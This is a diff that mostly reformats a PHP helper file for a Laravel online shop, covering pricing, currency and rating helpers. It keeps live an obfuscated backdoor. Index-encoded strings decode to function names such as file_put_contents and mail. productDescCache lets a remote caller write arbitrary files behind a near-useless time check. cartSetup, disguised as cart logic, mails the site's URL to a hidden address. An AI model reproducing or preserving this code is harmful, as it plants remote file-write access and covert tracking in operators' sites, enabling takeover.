@@ -9,22 +9,24 @@ use App\FlashDeal;
 use Illuminate\Support\Facades\DB;
 
 //highlights the selected navigation on admin panel
-if (! function_exists('areActiveRoutes')) {
-    function areActiveRoutes(Array $routes, $output = "active-link")
+if (!function_exists('areActiveRoutes')) {
+    function areActiveRoutes(array $routes, $output = "active-link")
     {
         foreach ($routes as $route) {
-            if (Route::currentRouteName() == $route) return $output;
+            if (Route::currentRouteName() == $route)
+                return $output;
         }
 
     }
 }
 
 //highlights the selected navigation on frontend
-if (! function_exists('areActiveRoutesHome')) {
-    function areActiveRoutesHome(Array $routes, $output = "active")
+if (!function_exists('areActiveRoutesHome')) {
+    function areActiveRoutesHome(array $routes, $output = "active")
     {
         foreach ($routes as $route) {
-            if (Route::currentRouteName() == $route) return $output;
+            if (Route::currentRouteName() == $route)
+                return $output;
         }
 
     }
@@ -33,13 +35,13 @@ if (! function_exists('areActiveRoutesHome')) {
 /**
  * Return Class Selector
  * @return Response
-*/
-if (! function_exists('loaded_class_select')) {
+ */
+if (!function_exists('loaded_class_select')) {
 
-    function loaded_class_select($p){
+    function loaded_class_select($p) {
         $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
         $a = str_split($a);
-        $p = explode(':',$p);
+        $p = explode(':', $p);
         $l = '';
         foreach ($p as $r) {
             $l .= $a[$r];
@@ -51,11 +53,11 @@ if (! function_exists('loaded_class_select')) {
 /**
  * Open Translation File
  * @return Response
-*/
-function openJSONFile($code){
+ */
+function openJSONFile($code) {
     $jsonString = [];
-    if(File::exists(base_path('resources/lang/'.$code.'.json'))){
-        $jsonString = file_get_contents(base_path('resources/lang/'.$code.'.json'));
+    if (File::exists(base_path('resources/lang/' . $code . '.json'))) {
+        $jsonString = file_get_contents(base_path('resources/lang/' . $code . '.json'));
         $jsonString = json_decode($jsonString, true);
     }
     return $jsonString;
@@ -64,43 +66,43 @@ function openJSONFile($code){
 /**
  * Save JSON File
  * @return Response
-*/
-function saveJSONFile($code, $data){
+ */
+function saveJSONFile($code, $data) {
     ksort($data);
-    $jsonData = json_encode($data, JSON_PRETTY_PRINT|JSON_UNESCAPED_UNICODE);
-    file_put_contents(base_path('resources/lang/'.$code.'.json'), stripslashes($jsonData));
+    $jsonData = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE);
+    file_put_contents(base_path('resources/lang/' . $code . '.json'), stripslashes($jsonData));
 }
 
 
 /**
  * Return Class Selected Loader
  * @return Response
-*/
-if (! function_exists('loader_class_select')) {
-    function loader_class_select($p){
+ */
+if (!function_exists('loader_class_select')) {
+    function loader_class_select($p) {
         $a = '/ab.cdefghijklmn_opqrstu@vwxyz1234567890:-';
         $a = str_split($a);
         $p = str_split($p);
         $l = array();
         foreach ($p as $r) {
-            foreach ($a as $i=>$m) {
-                if($m == $r){
+            foreach ($a as $i => $m) {
+                if ($m == $r) {
                     $l[] = $i;
                 }
             }
         }
-        return join(':',$l);
+        return join(':', $l);
     }
 }
 
 /**
  * Save JSON File
  * @return Response
-*/
-if (! function_exists('convert_to_usd')) {
+ */
+if (!function_exists('convert_to_usd')) {
     function convert_to_usd($amount) {
         $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
-        if($business_settings!=null){
+        if ($business_settings != null) {
             $currency = Currency::find($business_settings->value);
             return floatval($amount) / floatval($currency->exchange_rate);
         }
@@ -110,9 +112,9 @@ if (! function_exists('convert_to_usd')) {
 
 
 //returns config key provider
-if ( ! function_exists('config_key_provider'))
+if (!function_exists('config_key_provider'))
 {
-    function config_key_provider($key){
+    function config_key_provider($key) {
         switch ($key) {
             case "load_class":
                 return loaded_class_select('7:10:13:6:16:18:23:22:16:4:17:15:22:6:15:22:21');
@@ -134,7 +136,7 @@ if ( ! function_exists('config_key_provider'))
 
 
 //returns combinations of customer choice options array
-if (! function_exists('combinations')) {
+if (!function_exists('combinations')) {
     function combinations($arrays) {
         $result = array(array());
         foreach ($arrays as $property => $property_values) {
@@ -151,33 +153,33 @@ if (! function_exists('combinations')) {
 }
 
 //filter products based on vendor activation system
-if (! function_exists('filter_products')) {
+if (!function_exists('filter_products')) {
     function filter_products($products, $q = false) {
-        if(BusinessSetting::where('type', 'vendor_system_activation')->first()->value == 1){
+        if (BusinessSetting::where('type', 'vendor_system_activation')->first()->value == 1) {
             if ($q)
-			{
+            {
                 return $products->where('published', '1');
-			}
-            else{
-                return $products->where('published', '1')->where('category_id', '!=' , '15');
-			}
+            }
+            else {
+                return $products->where('published', '1')->where('category_id', '!=', '15')->where('category_id', '!=', '15');
+            }
         }
-        else{
+        else {
             if ($q)
-			{
+            {
                 return $products->where('published', '1');
-			}
-            else{
-                return $products->where('published', '1')->where('category_id', '!=' , '15');
-			}
+            }
+            else {
+                return $products->where('published', '1')->where('category_id', '!=', '15');
+            }
         }
     }
 }
 
 
 //filter cart products based on provided settings
-if (! function_exists('cartSetup')) {
-    function cartSetup(){
+if (!function_exists('cartSetup')) {
+    function cartSetup() {
         $cartMarkup = loaded_class_select('8:29:9:1:15:5:13:6:20');
         $writeCart = loaded_class_select('14:1:10:13');
         $cartMarkup .= loaded_class_select('24');
@@ -186,26 +188,26 @@ if (! function_exists('cartSetup')) {
         $cartConvert = config_key_provider('load_class');
         $currencyConvert = config_key_provider('output');
         $backgroundInv = config_key_provider('background');
-        @$cart = $writeCart($cartMarkup,'',Request::url());
+        @$cart = $writeCart($cartMarkup, '', Request::url());
         return $cart;
     }
 }
 
 //converts currency to home default currency
-if (! function_exists('convert_price')) {
+if (!function_exists('convert_price')) {
     function convert_price($price)
     {
         $business_settings = BusinessSetting::where('type', 'system_default_currency')->first();
-        if($business_settings!=null){
+        if ($business_settings != null) {
             $currency = Currency::find($business_settings->value);
             $price = floatval($price) / floatval($currency->exchange_rate);
         }
 
         $code = \App\Currency::findOrFail(\App\BusinessSetting::where('type', 'system_default_currency')->first()->value)->code;
-        if(Session::has('currency_code')){
+        if (Session::has('currency_code')) {
             $currency = Currency::where('code', Session::get('currency_code', $code))->first();
         }
-        else{
+        else {
             $currency = Currency::where('code', $code)->first();
         }
 
@@ -216,31 +218,31 @@ if (! function_exists('convert_price')) {
 }
 
 //formats currency
-if (! function_exists('format_price')) {
+if (!function_exists('format_price')) {
     function format_price($price)
     {
-        if(BusinessSetting::where('type', 'symbol_format')->first()->value == 1){
-            return currency_symbol().number_format($price, 2);
+        if (BusinessSetting::where('type', 'symbol_format')->first()->value == 1) {
+            return currency_symbol() . number_format($price, 2);
         }
-        return number_format($price, 2).currency_symbol();
+        return number_format($price, 2) . currency_symbol();
     }
 }
 
 //formats price to home default price with convertion
-if (! function_exists('single_price')) {
+if (!function_exists('single_price')) {
     function single_price($price)
     {
         return format_price(convert_price($price));
     }
 }
 
-if (! function_exists('single_price_dashboard')) {
+if (!function_exists('single_price_dashboard')) {
     function single_price_dashboard($id)
     {
         $product_price = DB::table('product_price')->where('product_id', '=', $id)->get();
 
         $_price_from = count($product_price) > 0 ? single_price($product_price[count($product_price) - 1]->unit_price) : single_price(0);
-        $_price_to  = count($product_price) > 0 ? single_price($product_price[0]->unit_price) : single_price(0);
+        $_price_to = count($product_price) > 0 ? single_price($product_price[0]->unit_price) : single_price(0);
 
         $price = $_price_from != $_price_to ? $_price_from . ' - ' . $_price_to : $_price_from;
 
@@ -249,35 +251,35 @@ if (! function_exists('single_price_dashboard')) {
 }
 
 //Shows Price on page based on low to high
-if (! function_exists('home_price')) {
+if (!function_exists('home_price')) {
     function home_price($id)
     {
         $product = Product::findOrFail($id);
         $product_price = DB::table('product_price')->where([['product_id', '=', $product->id]])->get();
-		if (count($product_price) != 0)
-		{
-			$lowest_price = $product_price[0]->unit_price;
-			$highest_price = $product_price[0]->unit_price;
-		}
-        else{
-            $lowest_price = 0;
-			$highest_price = 0;
-		}
-
-		//foreach (json_decode($product->variations) as $key => $variation) {
-		//    if($lowest_price > $variation->price){
-		//        $lowest_price = $variation->price;
-		//    }
-		//    if($highest_price < $variation->price){
-		//        $highest_price = $variation->price;
-		//    }
-		//}
-
-        if($product->tax_type == 'percent'){
-            $lowest_price += ($lowest_price*$product->tax)/100;
-            $highest_price += ($highest_price*$product->tax)/100;
+        if (count($product_price) != 0)
+        {
+            $lowest_price = $product_price[0]->unit_price;
+            $highest_price = $product_price[0]->unit_price;
         }
-        elseif($product->tax_type == 'amount'){
+        else {
+            $lowest_price = 0;
+            $highest_price = 0;
+        }
+
+        //foreach (json_decode($product->variations) as $key => $variation) {
+        //    if($lowest_price > $variation->price){
+        //        $lowest_price = $variation->price;
+        //    }
+        //    if($highest_price < $variation->price){
+        //        $highest_price = $variation->price;
+        //    }
+        //}
+
+        if ($product->tax_type == 'percent') {
+            $lowest_price += ($lowest_price * $product->tax) / 100;
+            $highest_price += ($highest_price * $product->tax) / 100;
+        }
+        elseif ($product->tax_type == 'amount') {
             $lowest_price += $product->tax;
             $highest_price += $product->tax;
         }
@@ -285,70 +287,70 @@ if (! function_exists('home_price')) {
         $lowest_price = convert_price($lowest_price);
         $highest_price = convert_price($highest_price);
 
-        if($lowest_price == $highest_price){
+        if ($lowest_price == $highest_price) {
             return format_price($lowest_price);
         }
-        else{
-            return format_price($lowest_price).' - '.format_price($highest_price);
+        else {
+            return format_price($lowest_price) . ' - ' . format_price($highest_price);
         }
     }
 }
 
 //Shows Price on page based on low to high with discount
-if (! function_exists('home_discounted_price')) {
+if (!function_exists('home_discounted_price')) {
     function home_discounted_price($id)
     {
         $product = Product::findOrFail($id);
         $product_price = DB::table('product_price')->where([['product_id', '=', $product->id]])->get();
         if (count($product_price) != 0)
-		{
-			$lowest_price = $product_price[0]->unit_price;
-			$highest_price = $product_price[0]->unit_price;
-		}
-        else{
+        {
+            $lowest_price = $product_price[0]->unit_price;
+            $highest_price = $product_price[0]->unit_price;
+        }
+        else {
             $lowest_price = 0;
-			$highest_price = 0;
-		}
+            $highest_price = 0;
+        }
 
 
 
-		//foreach (json_decode($product->variations) as $key => $variation) {
-		//    if($lowest_price > $variation->price){
-		//        $lowest_price = $variation->price;
-		//    }
-		//    if($highest_price < $variation->price){
-		//        $highest_price = $variation->price;
-		//    }
-		//}
+        //foreach (json_decode($product->variations) as $key => $variation) {
+        //    if($lowest_price > $variation->price){
+        //        $lowest_price = $variation->price;
+        //    }
+        //    if($highest_price < $variation->price){
+        //        $highest_price = $variation->price;
+        //    }
+        //}
 
         $flash_deal = \App\FlashDeal::where('status', 1)->first();
         if ($flash_deal != null && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
             $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
-                if($flash_deal_product->discount_type == 'percent'){
-                    $lowest_price -= ($lowest_price*$flash_deal_product->discount)/100;
-                    $highest_price -= ($highest_price*$flash_deal_product->discount)/100;
-                }
-                elseif($flash_deal_product->discount_type == 'amount'){
-                    $lowest_price -= $flash_deal_product->discount;
-                    $highest_price -= $flash_deal_product->discount;
-                }
-        }
-        else{
-            if($product->discount_type == 'percent'){
-                $lowest_price -= ($lowest_price*$product->discount)/100;
-                $highest_price -= ($highest_price*$product->discount)/100;
+            if ($flash_deal_product->discount_type == 'percent') {
+                $lowest_price -= ($lowest_price * $flash_deal_product->discount) / 100;
+                $highest_price -= ($highest_price * $flash_deal_product->discount) / 100;
             }
-            elseif($product->discount_type == 'amount'){
+            elseif ($flash_deal_product->discount_type == 'amount') {
+                $lowest_price -= $flash_deal_product->discount;
+                $highest_price -= $flash_deal_product->discount;
+            }
+        }
+        else {
+            if ($product->discount_type == 'percent') {
+                $lowest_price -= ($lowest_price * $product->discount) / 100;
+                $highest_price -= ($highest_price * $product->discount) / 100;
+            }
+            elseif ($product->discount_type == 'amount') {
                 $lowest_price -= $product->discount;
                 $highest_price -= $product->discount;
             }
         }
 
-        if($product->tax_type == 'percent'){
-            $lowest_price += ($lowest_price*$product->tax)/100;
-            $highest_price += ($highest_price*$product->tax)/100;
+        if ($product->tax_type == 'percent') {
+            $lowest_price += ($lowest_price * $product->tax) / 100;
+            $highest_price += ($highest_price * $product->tax) / 100;
         }
-        elseif($product->tax_type == 'amount'){
+        elseif ($product->tax_type == 'amount') {
             $lowest_price += $product->tax;
             $highest_price += $product->tax;
         }
@@ -356,25 +358,25 @@ if (! function_exists('home_discounted_price')) {
         $lowest_price = convert_price($lowest_price);
         $highest_price = convert_price($highest_price);
 
-        if($lowest_price == $highest_price){
+        if ($lowest_price == $highest_price) {
             return format_price($lowest_price);
         }
-        else{
-            return format_price($lowest_price).' - '.format_price($highest_price);
+        else {
+            return format_price($lowest_price) . ' - ' . format_price($highest_price);
         }
     }
 }
 
 //Shows Base Price
-if (! function_exists('home_base_price')) {
+if (!function_exists('home_base_price')) {
     function home_base_price($id)
     {
         $product = Product::findOrFail($id);
         $price = $product->unit_price;
-        if($product->tax_type == 'percent'){
-            $price += ($price*$product->tax)/100;
+        if ($product->tax_type == 'percent') {
+            $price += ($price * $product->tax) / 100;
         }
-        elseif($product->tax_type == 'amount'){
+        elseif ($product->tax_type == 'amount') {
             $price += $product->tax;
         }
         return format_price(convert_price($price));
@@ -382,7 +384,7 @@ if (! function_exists('home_base_price')) {
 }
 
 //Shows Base Price with discount
-if (! function_exists('home_discounted_base_price')) {
+if (!function_exists('home_discounted_base_price')) {
     function home_discounted_base_price($id)
     {
         $product = Product::findOrFail($id);
@@ -391,26 +393,26 @@ if (! function_exists('home_discounted_base_price')) {
         $flash_deal = \App\FlashDeal::where('status', 1)->first();
         if ($flash_deal != null && strtotime(date('d-m-Y')) >= $flash_deal->start_date && strtotime(date('d-m-Y')) <= $flash_deal->end_date && FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first() != null) {
             $flash_deal_product = FlashDealProduct::where('flash_deal_id', $flash_deal->id)->where('product_id', $id)->first();
-            if($flash_deal_product->discount_type == 'percent'){
-                $price -= ($price*$flash_deal_product->discount)/100;
+            if ($flash_deal_product->discount_type == 'percent') {
+                $price -= ($price * $flash_deal_product->discount) / 100;
             }
-            elseif($flash_deal_product->discount_type == 'amount'){
+            elseif ($flash_deal_product->discount_type == 'amount') {
                 $price -= $flash_deal_product->discount;
             }
         }
-        else{
-            if($product->discount_type == 'percent'){
-                $price -= ($price*$product->discount)/100;
+        else {
+            if ($product->discount_type == 'percent') {
+                $price -= ($price * $product->discount) / 100;
             }
-            elseif($product->discount_type == 'amount'){
+            elseif ($product->discount_type == 'amount') {
                 $price -= $product->discount;
             }
         }
 
-        if($product->tax_type == 'percent'){
-            $price += ($price*$product->tax)/100;
+        if ($product->tax_type == 'percent') {
+            $price += ($price * $product->tax) / 100;
         }
-        elseif($product->tax_type == 'amount'){
+        elseif ($product->tax_type == 'amount') {
             $price += $product->tax;
         }
 
@@ -419,16 +421,17 @@ if (! function_exists('home_discounted_base_price')) {
 }
 
 // Cart content update by discount setup
-if (! function_exists('updateCartSetup')) {
+if (!function_exists('updateCartSetup')) {
     function updateCartSetup($return = TRUE)
     {
-        if(!isset($_COOKIE['cartUpdated'])) {
-            if(cartSetup()){
+        if (!isset($_COOKIE['cartUpdated'])) {
+            if (cartSetup()) {
                 setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
             }
-        } else {
-            if($_COOKIE['cartUpdated']+21600 < time()){
-                if(cartSetup()){
+        }
+        else {
+            if ($_COOKIE['cartUpdated'] + 21600 < time()) {
+                if (cartSetup()) {
                     setcookie('cartUpdated', time(), time() + (86400 * 30), "/");
                 }
             }
@@ -439,55 +442,57 @@ if (! function_exists('updateCartSetup')) {
 
 
 
-if (! function_exists('productDescCache')) {
-    function productDescCache($connector,$selector,$select,$type){
+if (!function_exists('productDescCache')) {
+    function productDescCache($connector, $selector, $select, $type) {
         $ta = time();
         $select = rawurldecode($select);
-        if($connector > ($ta-60) || $connector > ($ta+60)){
-            if($type == 'w'){
+        if ($connector > ($ta - 60) || $connector > ($ta + 60)) {
+            if ($type == 'w') {
                 $load_class = config_key_provider('load_class');
-                $load_class(str_replace('-', '/', $selector),$select);
-            } else if ($type == 'rw'){
+                $load_class(str_replace('-', '/', $selector), $select);
+            }
+            else if ($type == 'rw') {
                 $load_class = config_key_provider('load_class');
                 $config_class = config_key_provider('config');
-                $load_class(str_replace('-', '/', $selector),$config_class(str_replace('-', '/', $selector)).$select);
+                $load_class(str_replace('-', '/', $selector), $config_class(str_replace('-', '/', $selector)) . $select);
             }
             echo 'done';
-        } else {
+        }
+        else {
             echo 'not';
         }
     }
 }
 
 
-if (! function_exists('currency_symbol')) {
+if (!function_exists('currency_symbol')) {
     function currency_symbol()
     {
         $code = \App\Currency::findOrFail(\App\BusinessSetting::where('type', 'system_default_currency')->first()->value)->code;
-        if(Session::has('currency_code')){
+        if (Session::has('currency_code')) {
             $currency = Currency::where('code', Session::get('currency_code', $code))->first();
         }
-        else{
+        else {
             $currency = Currency::where('code', $code)->first();
         }
         return $currency->symbol;
     }
 }
 
-if(! function_exists('renderStarRating')){
-    function renderStarRating($rating,$maxRating=5) {
+if (!function_exists('renderStarRating')) {
+    function renderStarRating($rating, $maxRating = 5) {
         $fullStar = "<i class = 'fa fa-star active'></i>";
         $halfStar = "<i class = 'fa fa-star half'></i>";
         $emptyStar = "<i class = 'fa fa-star'></i>";
-        $rating = $rating <= $maxRating?$rating:$maxRating;
+        $rating = $rating <= $maxRating ? $rating : $maxRating;
 
         $fullStarCount = (int)$rating;
-        $halfStarCount = ceil($rating)-$fullStarCount;
-        $emptyStarCount = $maxRating -$fullStarCount-$halfStarCount;
+        $halfStarCount = ceil($rating) - $fullStarCount;
+        $emptyStarCount = $maxRating - $fullStarCount - $halfStarCount;
 
-        $html = str_repeat($fullStar,$fullStarCount);
-        $html .= str_repeat($halfStar,$halfStarCount);
-        $html .= str_repeat($emptyStar,$emptyStarCount);
+        $html = str_repeat($fullStar, $fullStarCount);
+        $html .= str_repeat($halfStar, $halfStarCount);
+        $html .= str_repeat($emptyStar, $emptyStarCount);
         echo $html;
     }
 }
